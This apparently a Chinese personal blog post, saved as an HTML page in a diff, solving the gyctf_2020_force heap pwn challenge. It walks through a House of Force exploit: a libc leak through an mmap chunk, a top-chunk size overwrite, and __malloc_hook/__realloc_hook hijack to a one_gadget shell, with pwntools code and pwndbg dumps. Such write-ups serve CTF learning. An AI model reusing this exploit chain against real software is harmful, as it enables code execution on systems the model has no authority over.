@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/shuwen.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/shuwen.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言 搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，， 没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force  程序流程堆体，，，只有一个功能（puts函数没有用）  对于add  分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gyctf_2020_force">
+<meta property="og:url" content="http://yoursite.com/2021/04/27/23-47/index.html">
+<meta property="og:site_name" content="Shuwen&#39;s blog">
+<meta property="og:description" content="前言 搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，， 没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force  程序流程堆体，，，只有一个功能（puts函数没有用）  对于add  分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2021/04/27/23-47-Shuwen/image-20210427211531288.png">
+<meta property="og:image" content="http://yoursite.com/2021/04/27/23-47-Shuwen/image-20210427211635840.png">
+<meta property="article:published_time" content="2021-04-27T15:47:06.000Z">
+<meta property="article:modified_time" content="2021-04-27T15:55:44.586Z">
+<meta property="article:author" content="Shuwen">
+<meta property="article:tag" content="house of force">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/04/27/23-47-Shuwen/image-20210427211531288.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/04/27/23-47/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>gyctf_2020_force | Shuwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Shuwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">生活 & 学习</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/27/23-47/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/shuwen.jpg">
+      <meta itemprop="name" content="Shuwen">
+      <meta itemprop="description" content="做有意思的事，有意思地做事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shuwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          gyctf_2020_force
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-27 23:47:06 / 修改时间：23:55:44" itemprop="dateCreated datePublished" datetime="2021-04-27T23:47:06+08:00">2021-04-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<p><del>搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，，</del></p>
+<p>没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force</p>
+</blockquote>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>堆体，，，只有一个功能（puts函数没有用）</p>
+<p><img src="/2021/04/27/23-47-Shuwen/image-20210427211531288.png" alt="image-20210427211531288"></p>
+<p>对于add</p>
+<blockquote>
+<p>分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆溢出</p>
+</blockquote>
+<p><img src="/2021/04/27/23-47-Shuwen/image-20210427211635840.png" alt="image-20210427211635840"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于题目是保护全开，所以不能覆盖got表</p>
+<p>方法：</p>
+<ol>
+<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
+<li>正常分配堆块 =&gt; 泄露堆地址</li>
+<li>覆写top chunk‘size为0xffffffffffffffff，就可以将top chunk指针抬高</li>
+<li>使top chunk落在<code>__malloc_hook</code>附近，修改<code>__malloc_hook</code>和<code>__realloc_hook</code><ul>
+<li><code>__malloc_hook</code> =&gt; __realloc_hook + 0x10（为了满足one_gadget的限制） </li>
+<li><code>__realloc_hook</code> =&gt; one_gadget</li>
+</ul>
+</li>
+<li>malloc一下 =&gt; getshell</li>
+</ol>
+<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
+<p>保护全开，故考虑覆盖__malloc_hook</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file gyctf_2020_force </span><br><span class="line">gyctf_2020_force: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;6d464fea7805860b83ff9bc8f4467dd258ebd04f, stripped</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_force </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<h4 id="1-分配大块"><a href="#1-分配大块" class="headerlink" title="1.分配大块"></a>1.分配大块</h4><blockquote>
+<p>分配一个0x200000的超大块，启用mmap分配，与libc的偏移固定，并计算得到libc_base</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x7ff0e84e4010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e84e4000</span><br><span class="line">0x7ff0e84e4000:	0x0000000000000000	0x0000000000201002</span><br><span class="line">0x7ff0e84e4010:	0x000a7265746e6977	0x0000000000000000</span><br><span class="line">0x7ff0e84e4020:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x7ff0e84e4010</span><br><span class="line">0x7ff0e84e4010:	&quot;winter\n&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x559a9f799000     0x559a9f79a000 r-xp     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99a000     0x559a9f99b000 r--p     1000 1000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99b000     0x559a9f99c000 rw-p     1000 2000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x7ff0e84e4000     0x7ff0e86e5000 rw-p   201000 0      </span><br><span class="line">    0x7ff0e86e5000     0x7ff0e88a5000 r-xp   1c0000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e88a5000     0x7ff0e8aa5000 ---p   200000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa5000     0x7ff0e8aa9000 r--p     4000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa9000     0x7ff0e8aab000 rw-p     2000 1c4000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aab000     0x7ff0e8aaf000 rw-p     4000 0      </span><br><span class="line">    0x7ff0e8aaf000     0x7ff0e8ad5000 r-xp    26000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cb8000     0x7ff0e8cbb000 rw-p     3000 0      </span><br><span class="line">    0x7ff0e8cd4000     0x7ff0e8cd5000 r--p     1000 25000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd5000     0x7ff0e8cd6000 rw-p     1000 26000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd6000     0x7ff0e8cd7000 rw-p     1000 0      </span><br><span class="line">    0x7fffae287000     0x7fffae2a8000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7fffae2c0000     0x7fffae2c3000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7fffae2c3000     0x7fffae2c5000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] libc_base:0x7ff0e86e5000</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_addr  = add(<span class="number">0x200000</span>,<span class="string">'winter'</span>)</span><br><span class="line"><span class="comment">#0x7f52f5a7d000 - 0x7f52f587c010 = 0x200FF0</span></span><br><span class="line">libc_base = <span class="number">0x200FF0</span> + bin_addr</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
+<h4 id="2-正常分配"><a href="#2-正常分配" class="headerlink" title="2.正常分配"></a>2.正常分配</h4><blockquote>
+<p>正常分配，得到的地址，是heap的基地址，因为申请0x18的大小，故top chunk就在heap_base+0x10</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x559aa0cf3010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0xffffffffffffffff</span><br><span class="line">0x559aa0cf3030:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] heap_base:0x559aa0cf3010</span><br><span class="line">[+] top_chunk:0x559aa0cf3020</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">0x18</span>,payload)</span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heap_base))</span><br><span class="line">top_chunk = heap_base + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">"top_chunk:"</span>+hex(top_chunk))</span><br></pre></td></tr></table></figure>
+<h4 id="3-分配到malloc附近"><a href="#3-分配到malloc附近" class="headerlink" title="3.分配到malloc附近"></a>3.分配到malloc附近</h4><blockquote>
+<p><code>__malloc_hook</code>-0x33附近有\x7f，故分配到这里</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0x00002a5647db6ad1</span><br><span class="line">0x559aa0cf3030:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x559aa0cf3040:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = malloc_hook - top_chunk - <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">add(target,<span class="string">'aaaa'</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b20 - 0x33 - 5</span><br><span class="line">0x7ff0e8aa9ae8 &lt;_IO_wide_data_0+296&gt;:	0x0000000000000000	0x00007ff0e8aa8260</span><br><span class="line">0x7ff0e8aa9af8:	0xffffd5a9b8249529	0x00007ff0e876aea0</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e876aa70	0x0000000000000000</span><br><span class="line">0x7ff0e8aa9b18:	0x0000000000000000	0x0000000100000000</span><br></pre></td></tr></table></figure>
+<h4 id="4-覆写-malloc-hook"><a href="#4-覆写-malloc-hook" class="headerlink" title="4.覆写__malloc_hook"></a>4.覆写__malloc_hook</h4><blockquote>
+<p>用gadget覆写malloc_hook，为了调节栈帧（<a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">参考博客</a>），还覆写realloc_hook。</p>
+<ul>
+<li>realloc_hook =&gt; one_gadget</li>
+<li>malloc_hook =&gt; realloc_hook + 0x10</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b0d - 5</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e872a27a	0x00007ff0e8769720</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">realloc_data = one_gadget[<span class="number">1</span>] + libc_base</span><br><span class="line">malloc_data = realloc + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaaaaaaa'</span> + p64(realloc_data) + p64(malloc_data))</span><br></pre></td></tr></table></figure>
+<h4 id="5-malloc-gt-getshell"><a href="#5-malloc-gt-getshell" class="headerlink" title="5.malloc =&gt; getshell"></a>5.malloc =&gt; getshell</h4><blockquote>
+<p>执行一次malloc操作，即可get shell</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"puts"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"size"</span>)</span><br><span class="line">p.sendline(str(<span class="number">24</span>))</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
+<li>house of force</li>
+<li>realloc调节栈帧</li>
+</ol>
+<h3 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><p>参考博客：</p>
+<ul>
+<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105522043" target="_blank" rel="noopener">BUUCTF-PWN gyctf_2020_force（house of force）</a></li>
+<li><a href="https://www.cnblogs.com/zhwer/p/14135734.html" target="_blank" rel="noopener">gyctf_2020_force | House of force</a></li>
+</ul>
+<p>下载：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">文件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><a href="gyctf_2020_force">文件</a></td>
+</tr>
+<tr>
+<td style="text-align:center"><a href="libc-2.23.so">LIBC</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>Q：如果阅读本文需要付费，你是否愿意为此支付1元？</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="Shuwen 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Shuwen 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Shuwen
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2021/04/27/23-47/" title="gyctf_2020_force">http://yoursite.com/2021/04/27/23-47/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/house-of-force/" rel="tag"># house of force</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/25/23-34/" rel="prev" title="wdb_2018_2nd_easyfmt详解">
+      <i class="fa fa-chevron-left"></i> wdb_2018_2nd_easyfmt详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/30/16-30/" rel="next" title="软件安装">
+      软件安装 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序流程"><span class="nav-number">2.</span> <span class="nav-text">程序流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#详细过程"><span class="nav-number">4.</span> <span class="nav-text">详细过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0-基本信息"><span class="nav-number">4.1.</span> <span class="nav-text">0.基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-分配大块"><span class="nav-number">4.2.</span> <span class="nav-text">1.分配大块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-正常分配"><span class="nav-number">4.3.</span> <span class="nav-text">2.正常分配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-分配到malloc附近"><span class="nav-number">4.4.</span> <span class="nav-text">3.分配到malloc附近</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-覆写-malloc-hook"><span class="nav-number">4.5.</span> <span class="nav-text">4.覆写__malloc_hook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-malloc-gt-getshell"><span class="nav-number">4.6.</span> <span class="nav-text">5.malloc &#x3D;&gt; getshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考-amp-下载"><span class="nav-number">6.</span> <span class="nav-text">参考 &amp; 下载</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Shuwen"
+      src="/images/shuwen.jpg">
+  <p class="site-author-name" itemprop="name">Shuwen</p>
+  <div class="site-description" itemprop="description">做有意思的事，有意思地做事</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/warm-winter" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;warm-winter" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
